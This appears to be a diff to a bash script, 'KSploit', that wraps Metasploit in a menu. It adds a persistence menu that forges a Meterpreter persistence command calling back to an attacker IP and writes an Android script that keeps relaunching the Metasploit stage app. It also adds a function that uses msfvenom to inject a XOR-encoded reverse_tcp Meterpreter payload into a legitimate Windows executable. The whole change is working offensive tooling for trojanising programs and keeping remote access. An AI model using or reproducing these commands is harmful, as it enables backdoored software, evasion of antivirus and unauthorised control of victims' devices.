@@ -638,19 +638,137 @@ mfconsole()
 ################################################################################
 persist()
 {
+clear
+echo ${LIGHT_CYAN} 
+echo " ____               _     _                      "
+echo "|  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
+echo "| |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
+echo "|  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
+echo "|_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
+echo
+echo "${LIGHT_MAGENTA}  Use the persistence menu to quickly forge persistence scripts."
+echo ${YELLOW}
+echo "	   _____________________________________________"
+echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+echo "	  |---------------------------------------------|"
+echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
+echo "	  |---------------------------------------------|"
+echo "	  |    🤖${GREEN} 4 ${BLUE}Android Persistence Script.         ${YELLOW}|"
+echo "	  |---------------------------------------------|"
+echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
+echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+echo	
+
+
+
+#	echo
+#	echo 
+#	echo -e "${RED} ##################################################"
+#	echo -e " #${FGR}${LG}             💀   NOT READY!!!!   💀            ${NC}${RED}#" 
+#	echo -e " ##################################################"
+#	echo
+#	echo
+#	sleep 1
+#	clear
+#	goto start;
+#  exit 1; 
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
+   echo
+   echo
+   locals
+    case $opt in
+        1)
+          echo "         ${FGC}     Forging a Windows Persistence Script :     ${NC}${YELLOW}"
+	  echo
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+    	  read -p '	    Set Callback Interval* ' attinterval
+	  echo
+          echo 
+          echo -e "          |  ${GREEN}  ⌛⌛⌛ Your Persistence Script :     ${NC}${YELLOW}"                                                    
+    	  echo -e "          |                                                                "  
+          echo -e "          |    ---> run persistence -U -X -i $attinterval -r $attackerip -p $attackerport       ${NC}${YELLOW}        " 
+  	  echo 
+	  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
+	  exit 1
+	;;
+        2)
+          echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
+          touch $wdir/android.sh
+          echo "#!/bin/bash" > $wdir/android.sh
+          echo "while :" >> $wdir/android.sh
+          echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
+          echo "sleep 20" >> $wdir/android.sh
+          echo "done" >> $wdir/android.sh
+          sleep 2
+#          cat $wdir/android.sh
+          echo 
+          echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
+          echo -e "                Upload it to / on target android device${NC}" 
+  	  echo 
+	  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
+	  exit 1
+        ;;  
+	q)
+	  clear
+	  goto start;
+	;;
+	*)
+          clear 
+          error="$opt is not a valid option!"      	
+          persist
+	;;
+    esac
+
+}
+
+################################################################################
+# Windows executable payload injection
+################################################################################
+malexe()
+{
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo
 	clear 
 	echo
 	echo 
-	echo -e "${RED} ##################################################"
-	echo -e " #${FGR}${LG}             💀   NOT READY!!!!   💀            ${NC}${RED}#" 
-	echo -e " ##################################################"
+	echo -e "          ${BLUE}  -------------------------------------------------------------"
+	echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
+	echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
 	echo
+	echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
 	echo
-	sleep 1
+	   locals
+	echo ${LIGHT_CYAN}
+	read -p '   	       Set Attacker IP* ' attackerip
+	read -p '   	       Set Attacker Port* ' attackerport
+	echo -e "               💉💉💉💉💉💉💉💉💉💉💉💉💉"  
+	echo
+	read -p '   	       Path to exe for injection ' exepath
+	read -p '   	       Output filename ' outputname
+	echo 
+	echo -e "               💉💉💉 Injecting payload into $outputname ..."
+	echo $exepath
+	sleep 2
+	echo `msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe -o $wdir/$outputname`
+	echo -e "         ${FGG}${YELLOW}   💉💉💉   $wdir/$outputname saved   💉💉💉   ${NC}${LIGHT_CYAN}" &
+	sleep 40
 	clear
 	goto start;
   exit 1; 
-		echo 'Not Ready' 
+
 }
 
 ################################################################################
@@ -744,7 +862,8 @@ sleep .1
 echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
 sleep .1
 echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-sleep .5
+echo -ne ${FGC}${YELLOW}'                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
+sleep 2
 clear
 
 ################################################################################
@@ -773,9 +892,7 @@ start=${1:-"start"}
    echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
    echo 
-   echo "${LIGHT_MAGENTA}  KSploit is a user friendly control panel in which to drive many metasploit tasks "
-   echo "  such as generating shells, payloads, and persistence scripts on the fly, starting "
-   echo "  listeners, and suggesting payloads and exploits"
+   echo "${LIGHT_MAGENTA}  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits"
    echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
@@ -787,8 +904,10 @@ start=${1:-"start"}
    echo "	  |---------------------------------------------|"
    echo "	  |    💰${GREEN} 3 ${BLUE}To load the payloads menu.          ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-#   echo "	  |    🎯${GREEN} 4 ${BLUE}To load the persistence menu.       ${YELLOW}|"
-#   echo "	  |---------------------------------------------|"
+   echo "	  |    💉${GREEN} 4 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    ⌛${GREEN} 5 ${BLUE}To load the persistence menu.       ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} m ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
@@ -803,7 +922,7 @@ start=${1:-"start"}
      error="" 
    fi  
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,m,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5m,q]    " opt
    case "$opt" in
        1) listeners
          ;;
@@ -811,8 +930,10 @@ start=${1:-"start"}
          ;;
        3) payloads
          ;;
-#       4) persist
-#         ;;
+       4) malexe
+         ;;
+       5) persist
+         ;;
        m) mfconsole
          ;;
        q)
